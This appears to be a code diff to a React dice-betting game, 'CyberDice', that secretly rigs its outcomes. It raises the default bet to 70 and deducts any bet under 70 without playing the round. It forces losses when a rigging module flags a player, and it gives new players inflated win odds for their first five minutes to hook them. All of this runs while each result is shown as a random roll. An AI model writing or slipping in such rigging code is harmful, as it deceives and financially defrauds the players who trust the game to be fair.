@@ -1,11 +1,12 @@
 import React, { useRef, useEffect, useState } from 'react';
 import { synth } from '../../utils/audioSynth';
 import { Sparkles, X, Play, ShieldAlert, Award, Dices } from 'lucide-react';
+import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';
 
 interface GameProps {
   pokiBalance: number;
   onAwardBalance: (amount: number) => void;
-  onDeductBalance: (amount: number) => boolean;
+  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
   syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
   onClose: () => void;
 }
@@ -18,7 +19,7 @@ export default function CyberDice({
   onClose
 }: GameProps) {
   const [gameState, setGameState] = useState<'idle' | 'rolling' | 'settled'>('idle');
-  const [betAmount, setBetAmount] = useState<number>(10);
+  const [betAmount, setBetAmount] = useState<number>(70);
   const [rollType, setRollType] = useState<'under' | 'over'>('under');
   const [sliderVal, setSliderVal] = useState<number>(50);
 
@@ -77,7 +78,21 @@ export default function CyberDice({
       return;
     }
 
-    if (!onDeductBalance(parsedBet)) {
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+    if (!evaluation.allowed) {
+      alert(evaluation.reason || 'Bet blocked by security parameters.');
+      isStartingRef.current = false;
+      return;
+    }
+
+    if (parsedBet < 70) {
+      onDeductBalance(parsedBet, setBetAmount);
+      isStartingRef.current = false;
+      return;
+    }
+
+    if (!onDeductBalance(parsedBet, setBetAmount)) {
       alert('Insufficient Pokicoin balance.');
       isStartingRef.current = false;
       return;
@@ -102,7 +117,50 @@ export default function CyberDice({
         setTimeout(triggerRollCycle, 45 + cycles * 2); // gradual deceleration
       } else {
         // SETTLE ROLL OUTCOME
-        const finalOutcome = Math.floor(Math.random() * 100) + 1;
+        let finalOutcome = 50;
+
+        if (evaluation.shouldForceLoss) {
+          // Force a loss
+          if (rollType === 'under') {
+            // Must roll >= sliderVal (e.g. between sliderVal and 100)
+            finalOutcome = Math.floor(sliderVal + Math.random() * (100 - sliderVal)) + 1;
+          } else {
+            // Must roll <= sliderVal (e.g. between 1 and sliderVal)
+            finalOutcome = Math.floor(Math.random() * sliderVal) + 1;
+          }
+        } else {
+          // Check for Honeymoon Phase (within first 5 minutes of playing)
+          const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
+          const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
+
+          const rollRandom = Math.random();
+          let winChance = 0.48; // standard slight house edge
+
+          if (isHoneymoon && parsedBet < 150) {
+            winChance = 0.65;
+          } else if (evaluation.applyBrakeMode && parsedBet < 100) {
+            winChance = 0.58;
+          }
+
+          if (rollRandom < winChance) {
+            // Win
+            if (rollType === 'under') {
+              finalOutcome = Math.floor(Math.random() * (sliderVal - 1)) + 1;
+            } else {
+              finalOutcome = Math.floor(sliderVal + 1 + Math.random() * (99 - sliderVal));
+            }
+          } else {
+            // Lose
+            if (rollType === 'under') {
+              finalOutcome = Math.floor(sliderVal + Math.random() * (100 - sliderVal)) + 1;
+            } else {
+              finalOutcome = Math.floor(Math.random() * sliderVal) + 1;
+            }
+          }
+        }
+
+        // Clamp just in case
+        finalOutcome = Math.max(1, Math.min(100, finalOutcome));
         setDiceRoll(finalOutcome);
 
         let isWin = false;
@@ -122,9 +180,11 @@ export default function CyberDice({
         if (isWin) {
           synth.playLevelUp();
           onAwardBalance(payoutVal);
+          logWin(uId, parsedBet, payoutVal, 'Cyber Dice', pokiBalance);
           syncCasinoData('Cyber Dice', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
         } else {
           synth.playCrash();
+          logLoss(uId, parsedBet, 'Cyber Dice', pokiBalance);
           syncCasinoData('Cyber Dice', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
         }
       }
